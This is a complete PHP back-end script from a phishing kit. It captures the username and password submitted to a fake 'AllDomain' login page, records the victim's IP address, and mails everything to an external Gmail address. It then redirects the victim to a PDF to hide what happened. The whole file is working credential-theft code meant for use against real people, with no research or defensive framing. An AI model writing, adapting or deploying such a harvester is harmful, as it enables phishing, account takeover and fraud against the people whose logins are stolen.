<?php

$ip = getenv("REMOTE_ADDR");
$message .= "------------------ AllDomain Logz! --------------\n";
$message .= "                AllDomain! ID & Password \n";
$message .= "---------------------------------------------------\n";
$message .= "AllDomain ID: ".$_POST['username']."\n";
$message .= "Password: " .$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------- By Jatboss -----------\n";


$recipient = "soqhiewuca@gmail.com";

$subject = "AllDomain Logz!";
$from = "ali@results.net";
$headers = "From: $from\r\n";
$headers .= "Return-Path: <".$recipient.">\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$$headers .= "MIME-Version: 1.0\n";
$arr=array($recipient);
foreach ($arr as $recipient){$carcabot = mail($recipient,$subject,$message,$headers);}
if ($carcabot)
       {
           header("Location:CodeOfConduct.pdf");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?>